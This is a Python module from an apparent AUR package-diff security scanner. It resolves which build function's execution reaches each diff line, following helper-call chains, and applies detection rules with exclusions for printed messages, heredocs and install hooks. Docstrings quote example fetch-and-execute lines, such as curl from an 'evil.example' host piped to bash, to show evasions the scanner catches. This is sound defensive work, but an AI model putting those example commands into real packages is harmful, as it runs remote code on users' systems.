"""Extracted from rules.py: _scope."""

import re
from functools import lru_cache
import threading
from ..config import load_rules
from ..deps import _strip_comment
from ..file_kinds import shell_lines
from ..findings import stamp
from ..line_lex import _heredoc_body_indices, _printed_heredoc_body_indices, lex_lines
from ..tokenizer import (
    clean_lines,
    strip_boms,
)
from ._clamp import _COMMENT_OR_DEP_RE, _DEP_DECLARATION_RE, _is_message_line, _to_pairs, _unquoted_redirect_after, clamp, filter_raw_lines
from ._compiled import _compiled, resolve_generated_patterns

__all__ = ['ScopeResolver', '_CLASSIFY_ENTRIES', '_FUNCTION_CLOSE_RE', '_FUNCTION_NAME_CLASS', '_FUNCTION_NAME_RE', '_FUNCTION_OPEN_RE', '_blank_quoted', '_caller_closure_map', '_classified', '_classify_caller_closure', '_classify_enclosing_function', '_classify_line_context', '_classify_memo', '_enclosing_function_map', '_enclosing_function_map_cached', '_function_bodies', '_inline_body', '_scope_matches', '_starts_a_new_file', 'apply_rules']

_FUNCTION_NAME_CLASS = r"[A-Za-z0-9_@.+][A-Za-z0-9_@.+-]*"

_FUNCTION_OPEN_RE = re.compile(
    rf"^\s*(?:function\s+{_FUNCTION_NAME_CLASS}\s*(?:\(\s*\))?"
    rf"|{_FUNCTION_NAME_CLASS}\s*\(\s*\))\s*\{{"
)

_FUNCTION_CLOSE_RE = re.compile(r"^\s*\}")

_FUNCTION_NAME_RE = re.compile(
    rf"^\s*(?:function\s+({_FUNCTION_NAME_CLASS})\s*(?:\(\s*\))?"
    rf"|({_FUNCTION_NAME_CLASS})\s*\(\s*\))\s*\{{"
)

#: A display-metadata scalar assignment (`pkgdesc=`, `url=`).  The value is
#: rendered by the AUR as display text, never read as code; even the
#: reader-facing rules (R012/R013) skip it - see the reader_candidates build.
_METADATA_SCALAR_RE = re.compile(r"^(?:\+|)\s*(?:pkgdesc|url)\s*\+?=")

def _starts_a_new_file(line: str, previous: str) -> bool:
    """True when *line* begins a new file's section of the diff.

    A hunk shows part of a file, not all of it, so a `package() {` whose
    closing brace falls outside the hunk leaves the brace counter raised.
    It used to stay raised for the remainder of the diff, which placed
    every *subsequent file* inside that function: in the benign corpus a
    `.desktop` file's translated `Name[be]=` lines and a README's Spanish
    prose were both classified as `package()` body and scanned as shell.
    They are the bulk of what the crossfire family fired on.

    ``diff --git`` is unambiguous.  The ``---``/``+++`` pair is accepted
    too, for diffs generated without it, but only as a pair: a removed
    source line reading ``-- x`` appears in a diff as ``--- x``, and
    treating that alone as a header would reset scope on package content.
    """
    if line.startswith("diff --git "):
        return True
    return line.startswith("+++ ") and previous.startswith("--- ")

def _inline_body(stripped: str) -> bool:
    """True when a function opens and carries code on the same line.

    ``package() { curl evil | bash; }`` is a function body, but the
    opening line used to be classified before the depth counter moved,
    so it read as ``other`` and escaped every ``function_body`` scope.
    """
    match = _FUNCTION_OPEN_RE.search(stripped)
    if not match:
        return False
    rest = stripped[match.end():].strip()
    return bool(rest) and rest != "}"

def _classify_line_context(lines: list[str]) -> dict[int, str]:
    """Return {line_index: context_name} for each line.

    Contexts: ``"function_body"``, ``"message"``, or ``"other"``.
    """
    lines = shell_lines(lines)
    contexts: dict[int, str] = {}
    depth = 0
    previous = ""
    # A message can span lines inside one quoted string: audirvana's hook is
    # ``echo "`` followed by instructions-to-the-user lines and a closing
    # quote several lines later.  Only the first line matches
    # ``_MESSAGE_LINE_RE``; the continuation lines carried mkdir/redirect
    # text into C017/H017/H032 as if they ran.  Track the open quote and
    # classify every line inside a message-opened string as "message".
    open_quote = ""
    message_quote = False
    for i, lex in enumerate(lex_lines(lines, fragment=True)):
        line = lex.text
        if _starts_a_new_file(line, previous):
            depth = 0
            contexts[i] = "other"
            previous = line
            open_quote = ""
            message_quote = False
            continue
        previous = line
        code = lex.code.lstrip("+").lstrip()
        if _is_message_line(line):
            contexts[i] = "message"
        elif message_quote and open_quote:
            # Continuation of a printer's quoted string.  A `>` inside the
            # spanning quote is literal text; only a quote that closes on
            # this line and is followed by an unquoted `>` (``more" >
            # ~/.bashrc``) is a real write, which falls through to the
            # function-body classification so the write rules see it.
            if not _unquoted_redirect_after(lex.text, open_quote):
                contexts[i] = "message"
            else:
                # The quote closes and a real redirect follows, so the line
                # is code.  It still needs a context: the quote-state scan
                # below reads it.
                contexts[i] = ("function_body"
                               if depth > 0 or _inline_body(code) else "other")
        elif depth > 0 or _inline_body(code):
            contexts[i] = "function_body"
        else:
            contexts[i] = "other"
        # Advance the quote state on the raw text: escapes close no quote,
        # a `#` outside a quote starts a comment, and the state carries to
        # the next line, which is what makes the continuation visible.
        j = 0
        n = len(line)
        while j < n:
            char = line[j]
            if open_quote == "'":
                if char == "'":
                    open_quote = ""
                    message_quote = False
            elif open_quote == '"':
                if char == "\\":
                    j += 1
                elif char == '"':
                    open_quote = ""
                    message_quote = False
            elif char in "\"'":
                open_quote = char
                message_quote = contexts[i] == "message"
            elif char == "#" and (j == 0 or line[j - 1] in " \t"):
                break
            j += 1
        if _FUNCTION_OPEN_RE.search(code):
            depth += 1
            # Opened and closed on one line, so it must not leave the
            # counter raised for everything that follows.
            if code.rstrip().endswith("}"):
                depth -= 1
        elif _FUNCTION_CLOSE_RE.search(code):
            depth = max(0, depth - 1)
    return contexts

_classify_memo = threading.local()

_CLASSIFY_ENTRIES = 4

def _classified(kind: str, lines: list[str], compute):
    cache = getattr(_classify_memo, "cache", None)
    if cache is None:
        cache = _classify_memo.__dict__.setdefault("cache", {})
    key = (kind, tuple(lines))
    hit = cache.get(key)
    if hit is None:
        hit = compute(lines)
        cache[key] = hit
        while len(cache) > _CLASSIFY_ENTRIES:
            del cache[next(iter(cache))]
    return dict(hit)

def _classify_enclosing_function(lines: list[str]) -> dict[int, str]:
    """Memoised wrapper: see :func:`_enclosing_function_map`."""
    return _classified("fn", lines, _enclosing_function_map)

def _enclosing_function_map(lines: list[str]) -> dict[int, str]:
    """Cached on the lines: the scope resolver asks once per rule family.

    A fresh dict is returned so a caller cannot mutate another's view.
    """
    return dict(_enclosing_function_map_cached(tuple(lines)))

@lru_cache(maxsize=8)
def _enclosing_function_map_cached(lines: tuple[str, ...]) -> dict[int, str]:
    """Return ``{line_index: enclosing_function_name}``.

    Lines outside any function are absent from the mapping.  A bare
    header line is not considered inside its own function, matching
    :func:`_classify_line_context`; a header that also carries code
    (``pkgver() { ...; }``) is, since that code really does run there.
    """
    lines = tuple(shell_lines(list(lines)))
    enclosing: dict[int, str] = {}
    stack: list[str] = []
    previous = ""
    for i, lex in enumerate(lex_lines(lines, fragment=True)):
        line = lex.text
        if _starts_a_new_file(line, previous):
            stack.clear()
            previous = line
            continue
        previous = line
        code = lex.code.lstrip("+").lstrip()
        match = _FUNCTION_NAME_RE.search(code)
        name = (match.group(1) or match.group(2)) if match else None
        if stack:
            enclosing[i] = stack[-1]
        elif match and _inline_body(code):
            # Code sharing the line with its own `pkgver() {` header is
            # inside that function, so a scope naming it must match.
            enclosing[i] = name
        if match:
            stack.append(name)
        elif _FUNCTION_OPEN_RE.search(code):
            stack.append("")
        if _FUNCTION_OPEN_RE.search(code):
            if code.rstrip().endswith("}") and stack:
                stack.pop()
        elif _FUNCTION_CLOSE_RE.search(code) and stack:
            stack.pop()
    return enclosing

def _function_bodies(lines: list[str]) -> dict[str, list[str]]:
    """Return ``{function_name: [body lines]}``, innermost owner wins."""
    bodies: dict[str, list[str]] = {}
    fn_map = _enclosing_function_map(lines)
    for index, name in fn_map.items():
        if name:
            bodies.setdefault(name, []).append(lines[index])
    return bodies

def _blank_quoted(line: str) -> str:
    """Blank literal text inside quotes, keeping command substitutions.

    A function name in a printed message is data.  The exception is
    ``$(...)`` and backticks: they execute even inside double quotes, so a
    double-quoted span that carries one is left intact rather than risk
    dropping a real call edge (``echo "$(_fetch)"`` calls ``_fetch``).
    Single quotes suppress substitution, so they are always blank.
    """
    out: list[str] = []
    i = 0
    n = len(line)
    while i < n:
        ch = line[i]
        if ch == "'":
            end = line.find("'", i + 1)
            end = n if end == -1 else end + 1
            out.append(" " * (end - i))
            i = end
        elif ch == '"':
            j = i + 1
            escaped = False
            while j < n:
                c = line[j]
                if escaped:
                    escaped = False
                elif c == "\\":
                    escaped = True
                elif c == '"':
                    break
                j += 1
            span = line[i:j + 1]
            if "$(" in span or "`" in span:
                out.append(span)
            else:
                out.append(" " * len(span))
            i = j + 1
        else:
            out.append(ch)
            i += 1
    return "".join(out)

def _caller_closure_map(lines: list[str]) -> dict[str, frozenset[str]]:
    """Return ``{function_name: names that transitively call it}``.

    A named scope such as ``scope = ["pkgver"]`` asks "does this code run
    during pkgver?", but it was answered with "is this line lexically
    inside a function spelled pkgver?".  The reviewed party chooses the
    spelling, so the gate was theirs:

        _fetch() { curl -s "$url" | sed ...; }
        pkgver() { _fetch; }

    is network access in pkgver by any definition that matters, and R051
    did not see it.  Following the calls costs one pass and takes the
    naming decision back.
    """
    bodies = _function_bodies(lines)
    if len(bodies) < 2:
        return {}
    names = sorted(bodies, key=len, reverse=True)
    # A call is the name in command position: at the start of a command,
    # not an assignment to it and not the tail of a longer word or path.
    call_re = re.compile(
        r"(?:^|[;&|(){}`]|\$\(|\s)(" + "|".join(re.escape(n) for n in names)
        + r")(?=[\s;&|)}`]|$)"
    )
    calls: dict[str, set[str]] = {}
    for name, body in bodies.items():
        found = set()
        for line in body:
            # Comments and quoted strings are not shell: a comment in
            # ``post_install()`` reading "a package name" made
            # ``callers['package'] = {post_install}``, so a genuine
            # ``chmod 4755`` in ``package()`` was labelled
            # "package(), called from post_install()" and scored as an
            # install hook.
            readable = _blank_quoted(
                _strip_comment(line.lstrip("+").lstrip())
            )
            for match in call_re.finditer(readable):
                found.add(match.group(1))
        found.discard(name)
        calls[name] = found

    # Invert, then close over the inverted edges: pkgver -> _fetch means
    # _fetch's callers include pkgver, and anything reaching pkgver.
    callers: dict[str, set[str]] = {name: set() for name in bodies}
    for caller, callees in calls.items():
        for callee in callees:
            callers[callee].add(caller)
    for _ in range(len(bodies)):
        changed = False
        for name, direct in callers.items():
            grown = set(direct)
            for caller in direct:
                grown |= callers.get(caller, set())
            grown.discard(name)
            if grown != direct:
                callers[name] = grown
                changed = True
        if not changed:
            break
    return {name: frozenset(found) for name, found in callers.items() if found}

def _classify_caller_closure(lines: list[str]) -> dict[str, frozenset[str]]:
    """Memoised wrapper: see :func:`_caller_closure_map`."""
    return _classified("callers", lines, _caller_closure_map)

class ScopeResolver:
    """Which makepkg function's execution reaches a given diff line.

    Every code rule outside the config-driven set asked the same question -
    "is this line inside build/prepare/check/package?" - and answered it with
    the *direct* enclosing function.  The reviewed party writes the function
    names, so that answer was theirs to change:

        _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
        build()  { _fetch; bash "$srcdir/x.sh"; }

    ``_fetch`` is not in ``_CRITICAL_FUNCTIONS``, so H016 and H082 both stood
    down and a working fetch-and-execute scored as an ordinary download.
    R051 had already been given the call closure for its ``pkgver`` scope;
    this is the same closure, shared, so the remaining rules stop being
    evadable by declaring a function.

    *extra_lines* is the current PKGBUILD when the caller has it.  A diff
    shows a hunk, so the ``build()`` that calls the added helper may not be
    in it at all; the graph is built from the whole recipe where possible
    while findings still come only from added lines.
    """

    __slots__ = ("_fn", "_callers")

    def __init__(self, lines: list[str], extra_lines: list[str] | None = None):
        self._fn = _classify_enclosing_function(lines)
        graph_lines = lines if not extra_lines else list(lines) + list(extra_lines)
        self._callers = _classify_caller_closure(graph_lines)

    def direct(self, index: int) -> str | None:
        """The function a line is lexically inside, or None."""
        return self._fn.get(index)

    def within(self, index: int, names) -> str | None:
        """The name in *names* whose execution reaches *index*, or None.

        The direct enclosing function wins when it qualifies, so an
        unremarkable line in ``build()`` still reports ``build``.
        """
        enclosing = self._fn.get(index)
        if enclosing is None:
            return None
        if enclosing in names:
            return enclosing
        for caller in sorted(self._callers.get(enclosing, ())):
            if caller in names:
                return caller
        return None

    def label(self, index: int, names) -> str:
        """How to name the scope in a finding, without overstating it.

        A finding that says ``build()`` when the line is in ``_fetch()``
        sends the reader to the wrong place, so the indirection is named.
        """
        enclosing = self._fn.get(index)
        reached = self.within(index, names)
        if reached is None or enclosing is None or reached == enclosing:
            return reached or (enclosing or "")
        # Callers render this as `f"{label}()"`, so the trailing parens land
        # on the reached function and this one supplies its own.
        return f"{enclosing}(), called from {reached}"

def _scope_matches(
    scope: list[str],
    index: int,
    ctx_map: dict[int, str],
    fn_map: dict[int, str],
    caller_map: dict[str, frozenset[str]] | None = None,
) -> bool:
    """Check *index* against a rule's scope.

    A scope entry matches either a line context (``function_body``,
    ``message``, ``other``), the name of the enclosing function
    (``pkgver``, ``package``, ...), or the name of a function that
    transitively calls the enclosing one - a helper invoked from
    ``pkgver()`` runs during pkgver whatever it is called.
    """
    ctx = ctx_map.get(index, "other")
    if ctx in scope:
        return True
    enclosing = fn_map.get(index)
    if enclosing is None:
        return False
    if enclosing in scope:
        return True
    if not caller_map:
        return False
    return bool(caller_map.get(enclosing, frozenset()).intersection(scope))

#: Raw-line rules that read a URL out of any line.  They stand down on a
#: line that only prints text (``echo``/``printf``/``cat``); the URLs these
#: rules exist for are declared or fetched, not printed.  Ids rather than a
#: rule field because a shipped field would not reach an existing install's
#: rules.toml until a migration.
_INERT_URL_RULES = frozenset({"R046", "R047"})

#: URL-family raw-line rules that must not read the declared upstream
#: ``url=``/``*_url=`` scalar.  That URL is package metadata, not a fetched
#: source; ankaios's project homepage on github.io fired R152.
_URL_DECLARATION_RULES = frozenset({"R003", "R046", "R047", "R048", "R152"})

#: Rules that make no sense inside an install scriptlet.  A hook runs as
#: root on the *target* system after pacman unpacks the package, so an
#: absolute-path chmod/setcap/write there is packaging - the chrome-sandbox
#: 4755 fix and the old-DTB backup under /boot that Electron and kernel
#: packages ship in post_install - not the build-host privilege change or
#: live-filesystem write these rules exist for.
_HOOK_SCRIPTLET_EXCLUDED_RULES = frozenset({"R053", "R058", "R059"})

#: Rules that must not match the body of a *printed* heredoc.  A printed
#: heredoc body is literal output text, not executed shell: `cat <<MSG` with
#: no redirect and no pipe into an executor.  Write patterns (R052 matched
#: the openxlr .install script's advisory text as if it ran; R054 matched
#: infopanel's `echo … | sudo tee /etc/sysctl.d/…` setup instructions) must
#: not fire on it.  Reader-facing rules (R012/R013) deliberately keep seeing
#: heredoc bodies - their payload is aimed at whoever reads the file.
_PRINTED_HEREDOC_EXCLUDED_RULES = frozenset({"R052", "R054"})

#: Rules that must not match ANY literal heredoc body.  A body is data at
#: this position: text a later reader (or the installed artifact) consumes,
#: not a command the build runs.  R058 claims a build-time write outside the
#: package root; the launcher-script text inside a file-writing heredoc runs
#: at application runtime, so claiming its `cp` as a build write is the
#: bluebubbles false positive.
_HEREDOC_BODY_EXCLUDED_RULES = frozenset({"R058"})

#: Fetch-and-execute shape rules on a line that only *prints* text.  An
#: install hook that echoes `curl … | bash …` as an instruction to the
#: reader (arctis-sound-manager) runs nothing; the pipeline is literal
#: output.  A real pipeline never sits on a pure printer line: context
#: ``message`` already excludes any line with an unquoted chain or
#: redirect, so `echo x; curl … | bash` stays code.
_MESSAGE_LINE_EXCLUDED_RULES = frozenset({"R001", "R002", "R003", "R045"})


def apply_rules(
    resolved_strings: list[str],
    raw_diff_lines: list[str],
    rules: list[dict] | None = None,
    include_experimental: bool = False,
    line_map: dict[int, tuple[str, int]] | None = None,
    resolved_indices: list[int] | None = None,
    raw_indices: list[int] | None = None,
) -> list[dict]:
    """Match rules against diff lines and return triggered findings.

    *resolved_indices* maps each entry of *resolved_strings* back to its
    raw diff-line index (the third output of
    :func:`~trustsight.tokenizer.tokenize_and_resolve_indexed`).  Without
    it, resolved candidates are paired with their position in the resolved
    list, which is not a ``line_map`` key once assignment lines are
    omitted: resolved findings would carry no file/line (or, on a
    position collision, the wrong one).

    *raw_indices* does the same for the raw-line side: it parallels
    *raw_diff_lines* with the ``split_lines(diff_text)`` index each line
    came from (the first output of
    :func:`~trustsight.rules.get_raw_diff_lines_indexed`).  ``line_map``
    is keyed on split-lines positions, and *raw_diff_lines* joins
    continuations and drops blank lines, so without *raw_indices* a
    raw-line finding's own index is the wrong domain as soon as one such
    line precedes the match - it cited the wrong line, or across a file
    boundary the wrong file.
    """
    if rules is None:
        rules = list(load_rules())
    resolve_generated_patterns(rules)

    triggered = []
    # Both maps are built from the unclamped lines: context classification
    # is structural (does this line open a function?) and must not shift
    # because a long line was truncated for matching.
    ctx_map = _classify_line_context(raw_diff_lines)
    fn_map = _classify_enclosing_function(raw_diff_lines)
    caller_map = _classify_caller_closure(raw_diff_lines)

    # Candidate indices double as line_map keys, and line_map is keyed by
    # split_lines(diff_text) position while the raw candidates are indexed
    # into raw_diff_lines - a different domain once a continuation joins
    # or a blank line drops.  With raw_indices supplied, move every
    # raw-derived index into the split-lines domain up front, so scope
    # checks and file/line lookups agree.  A mismatched list is ignored:
    # better the legacy lookup than a crash inside matching.
    to_split = (
        raw_indices
        if raw_indices is not None and len(raw_indices) == len(raw_diff_lines)
        else None
    )
    if to_split is not None:
        ctx_map = {to_split[i]: ctx for i, ctx in ctx_map.items()}
        fn_map = {to_split[i]: fn for i, fn in fn_map.items()}

    # Track which lines belong to an install-scriptlet file section, so
    # _HOOK_SCRIPTLET_EXCLUDED_RULES can skip them: `+++ b/<name>` opens a
    # section and the next such header (or EOF) closes it.
    hook_raw: set[int] = set()
    _hook_file = False
    for _i, _ln in enumerate(raw_diff_lines):
        if _ln.startswith("+++ "):
            _hook_file = _ln[4:].strip().endswith(".install")
        if _hook_file:
            hook_raw.add(_i)
    hook_lines = (
        {to_split[i] for i in hook_raw} if to_split is not None else hook_raw
    )

    # Printed-heredoc body lines, in the same split-lines domain as the
    # raw candidates below: the helper reads +/-/plain line text, so run
    # it on raw_diff_lines and remap with to_split exactly like hook_lines.
    printed_raw = _printed_heredoc_body_indices(raw_diff_lines)
    printed_lines = (
        {to_split[i] for i in printed_raw} if to_split is not None
        else printed_raw
    )
    # Every literal heredoc body (printed, written to a file, or fed to a
    # config consumer): data, not executed shell at this position.  R058's
    # build-time write claim must not fire on script TEXT shipped inside a
    # `cat <<EOF > /usr/bin/launcher` body (bluebubbles): those commands run
    # later, as the installed artifact, not during the build.
    heredoc_raw = _heredoc_body_indices(raw_diff_lines)
    heredoc_lines = (
        {to_split[i] for i in heredoc_raw} if to_split is not None
        else heredoc_raw
    )

    # These three candidate lists do not vary per rule, but used to be
    # rebuilt inside the loop: with ~75 rules that was 75 filtering passes
    # over every line of the diff.  Built once and shared, read-only.
    # `a/b/../c` is `a/c` once the kernel opens it, and a raw-line rule
    # anchored on `$pkgdir/etc/cron.d/` read the traversal spelling as a
    # path into `/lib`.  Collapsed here as well as in the resolved text,
    # because the rules that own package-root staging read raw lines
    # deliberately - they need the quoting the tokenizer removes.
    filtered_raw = filter_raw_lines(raw_diff_lines)
    cleaned_raw = clean_lines([ln for _i, ln in filtered_raw])
    raw_candidates = [
        (to_split[i] if to_split is not None else i, cleaned)
        for (i, _ln), cleaned in zip(filtered_raw, cleaned_raw)
    ]
    added_candidates = [(i, ln) for i, ln in raw_candidates if ln.startswith("+")]
    if resolved_indices is not None:
        resolved_candidates = [
            (idx, clamp(line))
            for idx, line in zip(resolved_indices, resolved_strings)
        ]
    else:
        resolved_candidates = _to_pairs(resolved_strings)

    # Comments are filtered for raw-line rules by `filter_raw_lines` and were
    # not filtered for resolved ones, so a resolved rule read commented-out
    # text as code: `# curl ... | bash` scored R001 CRITICAL and H016 HIGH,
    # a Critical band on a line that runs nothing.
    #
    # Two lists rather than one filtered list, because `include_comments` is
    # exactly the opt-out: R012's payload is aimed at whoever *reads* the
    # file and is a comment nearly every time, so that rule needs the
    # unfiltered text and everything else needs the code.
    resolved_code_candidates = [
        (idx, line) for idx, line in resolved_candidates
        if not _COMMENT_OR_DEP_RE.match(line)
    ]

    # Comments and plain declarations are filtered out (or never resolved)
    # for every other rule, because a commented-out command does not run and
    # a `pkgdesc=` string is not executed.  R012 and R013 are the exceptions:
    # their payload is aimed at whoever *reads* the file - a reviewer, or the
    # model summarising it - so what matters is every line the new revision
    # shows a reader.  Removals are excluded: text this diff deletes is text
    # the reader will not see.
    #
    # Display-metadata scalars are the one exclusion for a *raw-line* reader
    # rule: a pkgdesc/url value is rendered by the AUR as display text, never
    # read as code, so an invisible character in marketing copy is cosmetic
    # (ddnsto-bin's R013 FATAL on a zero-width char in pkgdesc).  R013 has no
    # business there at all.  A resolved reader rule (R012) still sees the
    # metadata lines through the additive path below: its payload is aimed at
    # whoever reads the file, and pkgdesc is exactly such text.
    # The BOM strip applies here too: R013 is the rule that reads this list
    # and the rule a byte-order mark used to fire, at FATAL.
    reader_pairs = _to_pairs(raw_diff_lines)
    stripped_reader = strip_boms([ln for _i, ln in reader_pairs])

    def _reader(keep_metadata: bool) -> list:
        return [
            (to_split[i] if to_split is not None else i, stripped)
            for (i, ln), stripped in zip(reader_pairs, stripped_reader)
            if not ln.startswith("-") and not _DEP_DECLARATION_RE.match(ln)
            and (keep_metadata or not _METADATA_SCALAR_RE.match(ln))
        ]

    reader_candidates = _reader(keep_metadata=False)
    reader_with_metadata = _reader(keep_metadata=True)
    rules_by_id = {rule["id"]: rule for rule in rules}

    # R007 claims an install-file modification.  Its pattern is deliberately
    # broad (a PKGBUILD may add the file without a header), which also let it
    # fire on a `.install` name inside `source=()` - a file reference, not a
    # modification (bettbox).  Only a file header or an `install=` change is
    # a modification; whether a fully-added scriptlet file is genuinely new
    # is the watcher's business (it alone knows the baseline), and the
    # full-aur path already withholds unchanged scriptlets, so headers stay
    # claimed here.
    for rule in rules:
        if rule.get("enabled") is False:
            continue
        if rule.get("experimental") and not include_experimental:
            continue
        # H004 is a code rule (analysis/build.py).  A stale rules.toml from
        # before the migration would otherwise double-fire the regex form.
        if rule["id"] == "H004":
            continue

        match_target = rule.get("match_target", "raw_line")
        if match_target == "raw_line":
            candidates = (
                added_candidates if rule.get("added_only") else raw_candidates
            )
        else:
            candidates = resolved_code_candidates
        if rule.get("include_comments"):
            # For a raw-line rule the reader set *replaces* the default,
            # which drops the removed lines with it: a maintainer deleting a
            # hidden character must not score 100 for the cleanup.  For a
            # resolved rule it is additive - resolution still carries the
            # forms a variable hides.
            candidates = (
                reader_candidates if match_target == "raw_line"
                # The *unfiltered* resolved list here: a rule that opts into
                # comments must see them in the text resolution produced,
                # not only in the raw lines.  The reader set is the
                # metadata-preserving variant: for a resolved rule (R012)
                # pkgdesc is reader-facing text, while a raw-line reader
                # rule (R013) already got the metadata-filtered set above.
                else resolved_candidates + reader_with_metadata
            )

        compiled = _compiled(rule["pattern"], rule_id=rule.get("id", ""))
        if compiled is None:
            # A refused rule must not read as "this rule found nothing".
            # The verdict fails closed on the stage gap, so a pattern the
            # budget refused cannot yield a clean result.
            from ..coverage import note_stage_failure
            note_stage_failure(f"rule:{rule.get('id', '?')}")
            continue

        rule_scope = rule.get("scope") if match_target == "raw_line" else None

        for idx, item in candidates:
            if compiled.search(item):
                if rule["id"] in _HOOK_SCRIPTLET_EXCLUDED_RULES \
                        and idx in hook_lines:
                    # A chmod/setcap on an absolute path inside a hook is
                    # the package configuring its own payload at install
                    # time, not a build-host privilege change.
                    continue
                if rule["id"] in _PRINTED_HEREDOC_EXCLUDED_RULES \
                        and idx in printed_lines:
                    # A printed heredoc body is text for the user, not a
                    # command; write patterns must not match it (openxlr).
                    continue
                if rule["id"] in _MESSAGE_LINE_EXCLUDED_RULES \
                        and ctx_map.get(idx) == "message":
                    # A pipeline inside a pure printer line is printed text,
                    # not a command the build runs.
                    continue
                if rule["id"] in _HEREDOC_BODY_EXCLUDED_RULES \
                        and idx in heredoc_lines:
                    # Any literal heredoc body is data at this position;
                    # script text shipped inside a file-writing heredoc is
                    # not a build-time command (bluebubbles' launcher).
                    continue
                if rule["id"] in _INERT_URL_RULES:
                    # A URL on a line that only prints text is documentation,
                    # not a source (the reported `echo http://127.0.0.1:…`
                    # case).  The predicate exempts source declarations and
                    # fetch commands, so this only drops inert printers.
                    from ..buckets import url_line_is_inert
                    if url_line_is_inert(item):
                        continue
                if rule["id"] in _URL_DECLARATION_RULES:
                    stripped_item = item.lstrip("+").lstrip()
                    if _METADATA_SCALAR_RE.match(stripped_item):
                        continue
                if rule["id"] == "R007":
                    # See the note above: a source=() mention of the file
                    # name is a reference, not a modification.  Headers and
                    # install= wiring stay claimed (`install = ...` with
                    # spaces included).
                    stripped_item = item.lstrip("+").lstrip()
                    if not item.startswith("+++") and not re.match(
                            r"install\s*=", stripped_item):
                        continue
                if rule_scope and not _scope_matches(
                    rule_scope, idx, ctx_map, fn_map, caller_map
                ):
                    continue
                # A generic rule may defer to a more precise rule on the
                # same command.  This preserves one finding per operation
                # without making evaluation order part of the rule contract.
                if any(
                    (other := rules_by_id.get(other_id))
                    and other.get("enabled") is not False
                    and (not other.get("experimental") or include_experimental)
                    and other.get("match_target", "raw_line") == match_target
                    and (other_compiled := _compiled(other["pattern"]))
                    and other_compiled.search(item)
                    and (
                        not other.get("scope")
                        or _scope_matches(
                            other["scope"], idx, ctx_map, fn_map, caller_map
                        )
                    )
                    for other_id in rule.get("exclude_if_matches", [])
                ):
                    continue
                finding = {
                    "rule_id": rule["id"],
                    "name": rule["name"],
                    "severity": rule["severity"],
                    "category": rule["category"],
                    "match": item[:100],
                }
                if "weight_override" in rule:
                    finding["weight_override"] = rule["weight_override"]
                if line_map and idx in line_map:
                    finding["file"], finding["line"] = line_map[idx]
                triggered.append(stamp(finding, f"{rule['name']}: {{match}}"))
                break

    return triggered
